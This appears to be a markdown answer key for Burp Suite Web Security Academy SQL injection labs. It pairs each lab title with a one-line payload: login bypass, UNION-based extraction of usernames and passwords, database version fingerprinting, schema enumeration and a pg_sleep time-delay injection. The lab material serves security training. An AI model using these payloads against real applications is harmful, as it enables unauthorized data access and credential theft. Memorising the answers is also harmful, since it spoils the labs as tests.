# Burpsuite Lab Answers
## SQL injection 
### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
#### Solution: '+OR+1=1--
![](Images/SQL-1.png)

--------------------------------

### SQL injection vulnerability allowing login bypass
#### Solution: administrator'--
![](Images/SQL-2.png)

--------------------------------

### SQL injection UNION attack, determining the number of columns returned by the query
#### Solution: 'UNION SELECT NULL, NULL, NULL--
![](Images/SQL-3.png)

--------------------------------

### SQL injection UNION attack, finding a column containing text
#### Solution: 'UNION SELECT NULL,'HELLO BUDDY',NULL--
![](Images/SQL-4.png)

--------------------------------

### SQL injection UNION attack, retrieving data from other tables
#### Solution: 'UNION SELECT username, password FROM users--
![](Images/SQL-5a.png)
![](Images/SQL-5b.png)

--------------------------------

### SQL injection UNION attack, retrieving multiple values in a single column
#### Solution: 'UNION SELECT NULL,username||'~'||password FROM users--
![](Images/SQL-6.png)

--------------------------------

### SQL injection attack, querying the database type and version on Oracle
#### Solution: 'UNION SELECT BANNER, NULL FROM v$version--
![](Images/SQL-7.png)

--------------------------------

### SQL injection attack, querying the database type and version on MySQL and Microsoft
#### Solution: 'UNION SELECT @@version, NULL#
![](Images/SQL-8.png)

--------------------------------

### SQL injection attack, listing the database contents on non-Oracle databases
#### Solution: Step-1 : '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
![](Images/SQL-9a.png)
#### Solution: Step-2 : '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_qrktla'--
![](Images/SQL-9b.png)
#### Solution: Step-3 : '+UNION+SELECT+username_gwlqzm,+password_ikxmsh+FROM+users_qrktla-
![](Images/SQL-9c.png)

--------------------------------

### SQL injection attack, listing the database contents on Oracle
#### Solution: Step-1 : '+UNION+SELECT+table_name,NULL+FROM+all_tables--
![](Images/SQL-10a.png)
#### Solution: Step-2 : '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_KNHGDL'--
![](Images/SQL-10b.png)
#### Solution: Step-3 : '+UNION+SELECT+USERNAME_XEIEJW,+PASSWORD_UHIKUI+FROM+USERS_KNHGDL--
![](Images/SQL-10c.png)

--------------------------------

### Blind SQL injection with time delays
#### Solution: TrackingId=x'||pg_sleep(10)--
![](Images/SQL-13a.png)
